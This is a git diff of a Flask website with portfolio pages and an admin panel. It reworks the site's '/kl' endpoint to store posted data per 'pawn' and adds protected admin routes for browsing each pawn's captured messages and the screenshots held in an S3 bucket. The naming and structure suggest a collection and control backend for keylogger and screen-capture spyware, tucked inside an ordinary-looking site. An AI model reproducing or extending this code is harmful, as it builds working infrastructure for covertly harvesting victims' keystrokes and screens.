@@ -1,5 +1,4 @@
 import os
-from threading import Thread
 from flask import (
     render_template,
     request, 
@@ -23,10 +22,9 @@ from config import (
     ProdConfig, 
     DevConfig
 )
-from utils import notifyme
 from models import (
     User,
-    Message
+    Pawn,
 )
 import boto3
 
@@ -62,9 +60,6 @@ def home():
             return redirect(url_for('home'))
 
         flash('Your message has been sent.', 'success')
-        if app.config.get('ENV') == 'production':
-            Message(email=email, text=message)
-            Thread(target=notifyme, args=(f'New contact by {email}', message)).start()
 
         return redirect(url_for('home'))
     return render_template('home.html')
@@ -79,10 +74,15 @@ def projects():
 def kl():
     if request.method == 'POST':
         data = request.json.get('d')
-        message = escape(data)
-        Message(email='***KL***', text=message)
+        pawn = request.json.get('p', 'f')
+        p_obj = Pawn.query.filter_by(name=pawn).first()
+        if p_obj:
+            p_obj.add_message(data)
+        else:
+            p = Pawn(name=pawn)
+            p.add_message(data)
         return jsonify(success=True)
-    return jsonify(method='POST', params='d')
+    return jsonify(secret=1)
 
 
 @app.route('/ss')
@@ -112,25 +112,40 @@ def login():
     return render_template('login.html')
 
 
+@app.route('/admin/messages/<pawn_id>')
+@login_required
+def messages(pawn_id):
+    pawn = Pawn.query.get(pawn_id)
+    msgs = []
+    if pawn:
+        msgs = sorted(
+            pawn.messages[:200],
+            key=lambda x: x.timestamp,
+            reverse=True
+        )
+    return render_template('protected/messages.html', messages=msgs, pawn=pawn)
+
+
+@app.route('/admin/screens/<pawn_id>')
+@login_required
+def screens(pawn_id):
+    pawn = Pawn.query.get(pawn_id)
+    files = []
+    if pawn:
+        s3 = boto3.client('s3', aws_access_key_id=os.getenv('S3_KEY'), aws_secret_access_key=os.getenv('S3_SECRET_KEY'))
+        joscreen = boto3.resource('s3', aws_access_key_id=os.getenv('S3_KEY'),
+                                  aws_secret_access_key=os.getenv('S3_SECRET_KEY')).Bucket('joscreen')
+        for i in joscreen.objects.filter(Prefix=pawn.name):
+            s3.download_file(i.bucket_name, i.key, os.path.join(app.root_path, 'static/temp', i.key))
+        files = filter(lambda x: x.startswith(pawn.name), os.listdir(os.path.join(app.root_path, 'static/temp')))
+    return render_template('protected/screenshots.html', files=files)
+
+
 @app.route('/admin', methods=['GET', 'POST'])
 @login_required
 def admin():
-    if request.method == 'POST':
-        mid = request.form.get('message_id')
-        try:
-            m = Message.query.get(int(mid))
-            if m:
-                m.delete()
-        except ValueError:
-            pass
-        return redirect(url_for('admin'))
-
-    messages = sorted(
-        Message.query.all(),
-        key=lambda x: x.timestamp,
-        reverse=True
-    )
-    return render_template('protected/admin.html', messages=messages)
+    pawns = Pawn.query.all()
+    return render_template('protected/admin.html', pawns=pawns)
 
 
 @app.route('/logout')
